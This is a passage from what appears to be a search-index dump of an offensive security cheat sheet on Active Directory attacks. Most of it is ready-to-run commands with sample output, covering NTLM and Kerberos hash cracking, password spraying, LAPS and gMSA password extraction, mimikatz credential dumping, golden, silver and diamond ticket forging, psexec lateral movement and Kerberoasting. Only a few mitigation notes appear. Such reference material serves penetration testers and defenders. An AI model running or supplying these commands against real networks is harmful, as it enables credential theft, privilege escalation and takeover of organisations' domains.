<pre><code>sekurlsa::krbtgt\nlsadump::lsa /inject /name:krbtgt\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#crack-ntlm-hashes-with-hashcat","title":"Crack NTLM hashes with hashcat","text":"<p>Useful when you want to have the clear text password or when you need to make stats about weak passwords.</p> <p>Recommended wordlists: - Rockyou.txt - Have I Been Pwned founds - Weakpass.com - Read More at Methodology and Resources/Hash Cracking.md</p> <pre><code># Basic wordlist\n# (-O) will Optimize for 32 characters or less passwords\n# (-w 4) will set the workload to \"Insane\" \n$ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r myrules.rule --opencl-device-types 1,2\n# Generate a custom mask based on a wordlist\n$ git clone https://github.com/iphelix/pack/blob/master/README\n$ python2 statsgen.py ../hashcat.potfile -o hashcat.mask\n$ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask\n</code></pre> <p> If the password is not a confidential data (challenges/ctf), you can use online \"cracker\" like : - hashmob.net - crackstation.net - hashes.com</p>"},{"location":"active-directory/active-directory-attacks/#ntds-reversible-encryption","title":"NTDS Reversible Encryption","text":"<p><code>UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED</code> (0x00000080), if this bit is set, the password for this user stored encrypted in the directory - but in a reversible form.</p> <p>The key used to both encrypt and decrypt is the SYSKEY, which is stored in the registry and can be extracted by a domain admin. This means the hashes can be trivially reversed to the cleartext values, hence the term \u201creversible encryption\u201d.</p> <ul> <li>List users with \"Store passwords using reversible encryption\" enabled     <pre><code>Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl\n</code></pre></li> </ul> <p>The password retrieval is already handled by SecureAuthCorp/secretsdump.py and mimikatz, it will be displayed as CLEARTEXT. </p>"},{"location":"active-directory/active-directory-attacks/#user-hunting","title":"User Hunting","text":"<p>Sometimes you need to find a machine where a specific user is logged in.   You can remotely query every machines on the network to get a list of the users's sessions.</p> <ul> <li>CrackMapExec   <pre><code>cme smb 10.10.10.0/24 -u Administrator -p 'P@ssw0rd' --sessions\nSMB         10.10.10.10    445    WIN-8OJFTLMU1IG  [+] Enumerated sessions\nSMB         10.10.10.10    445    WIN-8OJFTLMU1IG  \\\\10.10.10.10            User:Administrator\n</code></pre></li> <li>Impacket Smbclient   <pre><code>$ impacket-smbclient Administrator@10.10.10.10\n# who\nhost:  \\\\10.10.10.10, user: Administrator, active:     1, idle:     0\n</code></pre></li> <li>PowerView Invoke-UserHunter   <pre><code># Find computers were a Domain Admin OR a specified user has a session\nInvoke-UserHunter\nInvoke-UserHunter -GroupName \"RDPUsers\"\nInvoke-UserHunter -Stealth\n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#password-spraying","title":"Password spraying","text":"<p>Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. </p> <p>The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates.  Most of the time the best passwords to spray are :</p> <ul> <li><code>P@ssw0rd01</code>, <code>Password123</code>, <code>Password1</code>, <code>Hello123</code>, <code>mimikatz</code></li> <li><code>Welcome1</code>/<code>Welcome01</code></li> <li>$Companyname1 :<code>$Microsoft1</code></li> <li>SeasonYear : <code>Winter2019*</code>, <code>Spring2020!</code>, <code>Summer2018?</code>, <code>Summer2020</code>, <code>July2020!</code></li> <li>Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)</li> <li>Empty Password (Hash:31d6cfe0d16ae931b73c59d7e0c089c0)</li> </ul>"},{"location":"active-directory/active-directory-attacks/#kerberos-pre-auth-bruteforcing","title":"Kerberos pre-auth bruteforcing","text":"<p>Using <code>kerbrute</code>, a tool to perform Kerberos pre-auth bruteforcing.</p> <p>Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771). * Username bruteforce   <pre><code>root@kali:~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt\n</code></pre> * Password bruteforce   <pre><code>root@kali:~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username\n</code></pre> * Password spray   <pre><code>root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123\nroot@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt\nroot@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#spray-a-pre-generated-passwords-list","title":"Spray a pre-generated passwords list","text":"<ul> <li>Using <code>crackmapexec</code> and <code>mp64</code> to generate passwords and spray them against SMB services on the network.   <pre><code>crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`\n</code></pre></li> <li>Using <code>DomainPasswordSpray</code> to spray a password against all users of a domain.   <pre><code># https://github.com/dafthack/DomainPasswordSpray\nInvoke-DomainPasswordSpray -Password Summer2021!\n# /!\\ be careful with the account lockout !\nInvoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt\n</code></pre></li> <li>Using <code>SMBAutoBrute</code>.   <pre><code>Invoke-SMBAutoBrute -UserList \"C:\\ProgramData\\admins.txt\" -PasswordList \"Password1, Welcome1, 1qazXDR%+\" -LockoutThreshold 5 -ShowVerbose\n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#spray-passwords-against-the-rdp-service","title":"Spray passwords against the RDP service","text":"<ul> <li>Using RDPassSpray to target RDP services.   <pre><code>git clone https://github.com/xFreed0m/RDPassSpray\npython3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]\n</code></pre></li> <li>Using hydra and ncrack to target RDP services.   <pre><code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10\nncrack \u2013connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10\n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#badpwdcount-attribute","title":"BadPwdCount attribute","text":"<p>The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown. <pre><code>$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users\nLDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSet: &lt;never&gt;\nLDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: &lt;never&gt;\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#password-in-ad-user-comment","title":"Password in AD User comment","text":"<pre><code>$ crackmapexec ldap domain.lab -u 'username' -p 'password' -M user-desc\n$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 -M get-desc-users\nGET-DESC... 10.0.2.11       389    dc01    [+] Found following users: \nGET-DESC... 10.0.2.11       389    dc01    User: Guest description: Built-in account for guest access to the computer/domain\nGET-DESC... 10.0.2.11       389    dc01    User: krbtgt description: Key Distribution Center Service Account\n</code></pre> <p>There are 3-4 fields that seem to be common in most AD schemas: <code>UserPassword</code>, <code>UnixUserPassword</code>, <code>unicodePwd</code> and <code>msSFU30Password</code>.</p> <pre><code>enum4linux | grep -i desc\nGet-WmiObject -Class Win32_UserAccount -Filter \"Domain='COMPANYDOMAIN' AND Disabled='False'\" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID\n</code></pre> <p>or dump the Active Directory and <code>grep</code> the content.</p> <pre><code>ldapdomaindump -u 'DOMAIN\\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#password-of-pre-created-computer-account","title":"Password of Pre-Created Computer Account","text":"<p>When <code>Assign this computer account as a pre-Windows 2000 computer</code> checkmark is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account SERVERDEMO$ would have the password serverdemo. </p> <pre><code># Create a machine with default password\n# must be run from a domain joined device connected to the domain\ndjoin /PROVISION /DOMAIN &lt;fqdn&gt; /MACHINE evilpc /SAVEFILE C:\\temp\\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc\n</code></pre> <ul> <li>When you attempt to login using the credential you should have the following error code : <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>.</li> <li>Then you need to change the password with rpcchangepwd.py</li> </ul>"},{"location":"active-directory/active-directory-attacks/#reading-laps-password","title":"Reading LAPS Password","text":"<p>Use LAPS to automatically manage local administrator passwords on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored in Active Directory infrastructure. </p>"},{"location":"active-directory/active-directory-attacks/#determine-if-laps-is-installed","title":"Determine if LAPS is installed","text":"<pre><code>Get-ChildItem 'c:\\program files\\LAPS\\CSE\\Admpwd.dll'\nGet-FileHash 'c:\\program files\\LAPS\\CSE\\Admpwd.dll'\nGet-AuthenticodeSignature 'c:\\program files\\LAPS\\CSE\\Admpwd.dll'\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#extract-laps-password","title":"Extract LAPS password","text":"<p>The \"ms-mcs-AdmPwd\" a \"confidential\" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users  - From Windows:</p> <ul> <li> <p>adsisearcher (native binary on Windows 8+)        <pre><code>([adsisearcher]\"(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))\").findAll() | ForEach-Object { $_.properties}\n([adsisearcher]\"(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))\").findAll() | ForEach-Object { $_.properties}\n</code></pre></p> </li> <li> <p>PowerView <pre><code>PS &gt; Import-Module .\\PowerView.ps1\nPS &gt; Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime\n</code></pre></p> </li> <li> <p>LAPSToolkit <pre><code>$ Get-LAPSComputers\nComputerName                Password                                 Expiration         \n------------                --------                                 ----------         \nexample.domain.local        dbZu7;vGaI)Y6w1L                         02/21/2021 22:29:18\n$ Find-LAPSDelegatedGroups\n$ Find-AdmPwdExtendedRights\n</code></pre></p> </li> <li> <p>Powershell AdmPwd.PS        <pre><code>foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}\n</code></pre></p> </li> <li> <p>From Linux:</p> </li> <li> <p>pyLAPS to read and write LAPS passwords:        <pre><code># Read the password of all computers\n./pyLAPS.py --action get -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1\n# Write a random password to a specific computer\n./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1\n</code></pre></p> </li> <li> <p>CrackMapExec:        <pre><code>crackmapexec smb 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps\n</code></pre></p> </li> <li> <p>LAPSDumper <pre><code>python laps.py -u 'user' -p 'password' -d 'domain.local'\npython laps.py -u 'user' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c' -d 'domain.local' -l 'dc01.domain.local'\n</code></pre></p> </li> <li> <p>ldapsearch       <pre><code>ldapsearch -x -h  -D \"@\" -w  -b \"dc=&lt;&gt;,dc=&lt;&gt;,dc=&lt;&gt;\" \"(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*))\" ms-MCS-AdmPwd`\n</code></pre></p> </li> </ul>"},{"location":"active-directory/active-directory-attacks/#grant-laps-access","title":"Grant LAPS Access","text":"<p>The members of the group \"Account Operator\" can add and modify all the non admin users and groups. Since LAPS ADM and LAPS READ are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password <pre><code>Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain \"domain.local\"\nAdd-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain \"domain.local\"\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#reading-gmsa-password","title":"Reading GMSA Password","text":"<p>User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of 256 bytes.</p>"},{"location":"active-directory/active-directory-attacks/#gmsa-attributes-in-the-active-directory","title":"GMSA Attributes in the Active Directory","text":"<ul> <li><code>msDS-GroupMSAMembership</code> (<code>PrincipalsAllowedToRetrieveManagedPassword</code>) - stores the security principals that can access the GMSA password.</li> <li><code>msds-ManagedPassword</code> - This attribute contains a BLOB with password information for group-managed service accounts.</li> <li><code>msDS-ManagedPasswordId</code> - This constructed attribute contains the key identifier for the current managed password data for a group MSA.</li> <li><code>msDS-ManagedPasswordInterval</code> - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.</li> </ul>"},{"location":"active-directory/active-directory-attacks/#extract-nt-hash-from-the-active-directory","title":"Extract NT hash from the Active Directory","text":"<ul> <li>mpgn/CrackMapExec <pre><code># Use --lsa to get GMSA ID\ncrackmapexec ldap domain.lab -u user -p 'PWD' --gmsa-convert-id 00[...]99\ncrackmapexec ldap domain.lab -u user -p 'PWD' --gmsa-decrypt-lsa '_SC_GMSA_{[...]}_.....'\n</code></pre></li> <li>rvazarkar/GMSAPasswordReader <pre><code>GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT\n</code></pre></li> <li> <p>micahvandeusen/gMSADumper <code>powershell   python3 gMSADumper.py -u User -p Password1 -d domain.local</code></p> </li> <li> <p>Active Directory Powershell   <pre><code>$gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'\n$blob = $gmsa.'msDS-ManagedPassword'\n$mp = ConvertFrom-ADManagedPasswordBlob $blob\n$hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword\n</code></pre></p> </li> <li>kdejoyce/gMSA_Permissions_Collection.ps1 based on Active Directory PowerShell module</li> </ul>"},{"location":"active-directory/active-directory-attacks/#forging-golden-gmsa","title":"Forging Golden GMSA","text":"<p>One notable difference between a Golden Ticket attack and the Golden GMSA attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.  You can't \"force reset\" a gMSA password, because a gMSA's password never changes. The password is derived from the KDS root key and <code>ManagedPasswordIntervalInDays</code>, so every Domain Controller can at any time compute what the password is, what it used to be, and what it will be at any point in the future. * Using GoldenGMSA <pre><code># Enumerate all gMSAs\nGoldenGMSA.exe gmsainfo\n# Query for a specific gMSA\nGoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112\n# Dump all KDS Root Keys\nGoldenGMSA.exe kdsinfo\n# Dump a specific KDS Root Key\nGoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb\n# Compute gMSA password\n# --sid &lt;gMSA SID&gt;: SID of the gMSA (required)\n# --kdskey &lt;Base64-encoded blob&gt;: Base64 encoded KDS Root Key\n# --pwdid &lt;Base64-encoded blob&gt;: Base64 of msds-ManagedPasswordID attribute value\nGoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 # requires privileged access to the domain\nGoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M= # requires LDAP access\nGoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA # Offline mode\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#kerberos-tickets","title":"Kerberos Tickets","text":"<p>Tickets are used to grant access to network resources. A ticket is a data structure that contains information about the user's identity, the network service or resource being accessed, and the permissions or privileges associated with that resource. Kerberos tickets have a limited lifetime and expire after a set period of time, typically 8 to 12 hours.</p> <p>There are two types of tickets in Kerberos:</p> <ul> <li> <p>Ticket Granting Ticket (TGT): The TGT is obtained by the user during the initial authentication process. It is used to request additional service tickets without requiring the user to re-enter their credentials. The TGT contains the user's identity, a timestamp, and an encryption of the user's secret key.</p> </li> <li> <p>Service Ticket (ST): The service ticket is used to access a specific network service or resource. The user presents the service ticket to the service or resource, which then uses the ticket to authenticate the user and grant access to the requested resource. The service ticket contains the user's identity, a timestamp, and an encryption of the service's secret key.</p> </li> </ul>"},{"location":"active-directory/active-directory-attacks/#dump-kerberos-tickets","title":"Dump Kerberos Tickets","text":"<ul> <li>Mimikatz: <code>sekurlsa::tickets /export</code></li> <li>Rubeus    <pre><code># List available tickets\nRubeus.exe triage\n# Dump one ticket, the output is in Kirbi format\nRubeus.exe dump /luid:0x12d1f7\n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#replay-kerberos-tickets","title":"Replay Kerberos Tickets","text":"<ul> <li>Mimikatz: <code>mimikatz.exe \"kerberos::ptc C:\\temp\\TGT_Administrator@lab.local.ccache\"</code></li> <li>CrackMapExec: <code>KRB5CCNAME=/tmp/administrator.ccache crackmapexec smb 10.10.10 -u user --use-kcache</code></li> </ul>"},{"location":"active-directory/active-directory-attacks/#convert-kerberos-tickets","title":"Convert Kerberos Tickets","text":"<p>In the Kerberos authentication protocol, ccache and kirbi are two types of Kerberos credential caches that are used to store Kerberos tickets.</p> <ul> <li> <p>A credential cache, or <code>\"ccache\"</code> is a temporary storage area for Kerberos tickets that are obtained during the authentication process. The ccache contains the user's authentication credentials and is used to access network resources without having to re-enter the user's credentials for each request.</p> </li> <li> <p>The Kerberos Integrated Windows Authentication (KIWA) protocol used by Microsoft Windows systems also makes use of a credential cache called a <code>\"kirbi\"</code> cache. The kirbi cache is similar to the ccache used by standard Kerberos implementations, but with some differences in the way it is structured and managed.</p> </li> </ul> <p>While both caches serve the same basic purpose of storing Kerberos tickets to enable efficient access to network resources, they differ in format and structure. You can convert them easily using:</p> <ul> <li>kekeo: <code>misc::convert ccache ticket.kirbi</code></li> <li>impacket: <code>impacket-ticketConverter SRV01.kirbi SRV01.ccache</code></li> </ul>"},{"location":"active-directory/active-directory-attacks/#pass-the-ticket-golden-tickets","title":"Pass-the-Ticket Golden Tickets","text":"<p>Forging a TGT require: * the <code>krbtgt</code> NT hash * since recently, we cannot use a non-existent account name as a result of <code>CVE-2021-42287</code> mitigations</p> <p>The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt NT hash must be used.</p>"},{"location":"active-directory/active-directory-attacks/#using-mimikatz","title":"Using Mimikatz","text":"<pre><code># Get info - Mimikatz\nlsadump::lsa /inject /name:krbtgt\nlsadump::lsa /patch\nlsadump::trust /patch\nlsadump::dcsync /user:krbtgt\n# Forge a Golden ticket - Mimikatz\nkerberos::purge\nkerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt\nkerberos::tgt\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#using-meterpreter","title":"Using Meterpreter","text":"<pre><code># Get info - Meterpreter(kiwi)\ndcsync_ntlm krbtgt\ndcsync krbtgt\n# Forge a Golden ticket - Meterpreter\nload kiwi\ngolden_ticket_create -d &lt;domainname&gt; -k &lt;nthashof krbtgt&gt; -s &lt;SID without le RID&gt; -u &lt;user_for_the_ticket&gt; -t &lt;location_to_store_tck&gt;\ngolden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck\nkerberos_ticket_purge\nkerberos_ticket_use /root/Downloads/pentestlabuser.tck\nkerberos_ticket_list\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#using-a-ticket-on-linux","title":"Using a ticket on Linux","text":"<pre><code># Convert the ticket kirbi to ccache with kekeo\nmisc::convert ccache ticket.kirbi\n# Alternatively you can use ticketer from Impacket\n./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da\nticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519\n./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519\nexport KRB5CCNAME=/home/user/ticket.ccache\ncat $KRB5CCNAME\n# NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file\n./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 \n</code></pre> <p>If you need to swap ticket between Windows and Linux, you need to convert them with <code>ticket_converter</code> or <code>kekeo</code>.</p> <pre><code>root@kali:ticket_converter$ python ticket_converter.py velociraptor.ccache velociraptor.kirbi\nConverting ccache =&gt; kirbi\nroot@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache\nConverting kirbi =&gt; ccache\n</code></pre> <p>Mitigations: * Hard to detect because they are legit TGT tickets * Mimikatz generate a golden ticket with a life-span of 10 years</p>"},{"location":"active-directory/active-directory-attacks/#pass-the-ticket-silver-tickets","title":"Pass-the-Ticket Silver Tickets","text":"<p>Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.</p> <pre><code># Create a ticket for the service\nmimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE\n# Examples\nmimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt\nmimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park\n# Then use the same steps as a Golden ticket\nmimikatz $ misc::convert ccache ticket.kirbi\nroot@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache\nroot@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 \n</code></pre> <p>Interesting services to target with a silver ticket :</p> Service Type Service Silver Tickets Attack WMI HOST + RPCSS <code>wmic.exe /authority:\"kerberos:DOMAIN\\DC01\" /node:\"DC01\" process call create \"cmd /c evil.exe\"</code> PowerShell Remoting CIFS + HTTP + (wsman?) <code>New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC</code> WinRM HTTP + wsman <code>New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC</code> Scheduled Tasks HOST <code>schtasks /create /s dc01 /SC WEEKLY /RU \"NT Authority\\System\" /IN \"SCOM Agent Health Check\" /IR \"C:/shell.ps1\"</code> Windows File Share (CIFS) CIFS <code>dir \\\\dc01\\c$</code> LDAP operations including Mimikatz DCSync LDAP <code>lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt</code> Windows Remote Server Administration Tools RPCSS   + LDAP  + CIFS / <p>Mitigations: * Set the attribute \"Account is Sensitive and Cannot be Delegated\" to prevent lateral movement with the generated ticket.</p>"},{"location":"active-directory/active-directory-attacks/#pass-the-ticket-diamond-tickets","title":"Pass-the-Ticket Diamond Tickets","text":"<p>Request a legit low-priv TGT and recalculate only the PAC field providing the krbtgt encryption key</p> <p>Require:  * krbtgt NT Hash * krbtgt AES key</p> <pre><code>ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'\nRubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#pass-the-ticket-sapphire-tickets","title":"Pass-the-Ticket Sapphire Tickets","text":"<p>Requesting the target user's PAC with <code>S4U2self+U2U</code> exchange during TGS-REQ(P) (PKINIT). The goal is to mimic the PAC field as close as possible to a legitimate one. Require: * Impacket PR#1411 * krbtgt AES key <pre><code># baduser argument will be ignored\nticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#kerberoasting","title":"Kerberoasting","text":"<p>\"A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. \" - MSDN Any valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as. * GetUserSPNs from Impacket Suite   <pre><code>$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request\nImpacket v0.9.17 - Copyright 2002-2018 Core Security Technologies\nServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           \n--------------------  -------------  --------------------------------------------------------  -------------------  -------------------\nactive/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-12-03 17:11:11 \n$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43[...]84fd2\n</code></pre> * CrackMapExec Module   <pre><code>$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt\nLDAP        10.0.2.11       389    dc01           [*] Windows 10.0 Build 17763 x64 (name:dc01) (domain:lab.local) (signing:True) (SMBv1:False)\nLDAP        10.0.2.11       389    dc01           $krb5tgs$23$*john.doe$lab.local$MSSQLSvc/dc01.lab.local~1433*$efea32[...]49a5e82$b28fc61[...]f800f6dcd259ea1fca8f9\n</code></pre> * Rubeus <pre><code># Stats\nRubeus.exe kerberoast /stats\n-------------------------------------   ----------------------------------\n| Supported Encryption Type | Count |  | Password Last Set Year | Count |\n-------------------------------------  ----------------------------------\n| RC4_HMAC_DEFAULT          | 1     |  | 2021                   | 1     |\n-------------------------------------  ----------------------------------\n# Kerberoast (RC4 ticket)\nRubeus.exe kerberoast /creduser:DOMAIN\\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt\n# Kerberoast (AES ticket)\n# Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.\nRubeus.exe kerberoast /tgtdeleg\n# Kerberoast (RC4 ticket)\n# The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.\nRubeus.exe kerberoast /rc4opsec\n</code></pre> * PowerView <pre><code>Request-SPNTicket -SPN \"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local\"\n</code></pre> * bifrost on macOS machine   <pre><code>./bifrost -action asktgs -ticket doIF&lt;...snip...&gt;QUw= -service host/dc1-lab.lab.local -kerberoast true\n</code></pre> * targetedKerberoast <pre><code># for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), \n# print the \"kerberoast\" hash, and delete the temporary SPN set for that operation\ntargetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]\n</code></pre> Then crack the ticket using the correct hashcat mode (<code>$krb5tgs$23</code>= <code>etype 23</code>) </p> Mode Description <code>13100</code> Kerberos 5 TGS-REP etype 23 (RC4) <code>19600</code> Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) <code>19700</code> Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) <pre><code>./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt\n./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt\n</code></pre> Mitigations: * Have a very long password for your accounts with SPNs (&gt; 32 characters) * Make sure no users have SPNs ## KRB_AS_REP Roasting &gt; If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting Requirements: - Accounts with the attribute DONT_REQ_PREAUTH (<code>PowerView &gt; Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose</code>) * Rubeus <pre><code>C:\\Rubeus&gt;Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast\n[*] Action: AS-REP roasting\n[*] Target User            : TestOU3user\n[*] Target Domain          : testlab.local\n[*] SamAccountName         : TestOU3user\n[*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local\n[*] Using domain controller: testlab.local (192.168.52.100)\n[*] Building AS-REQ (w/o preauth) for: 'testlab.local\\TestOU3user'\n[*] Connecting to 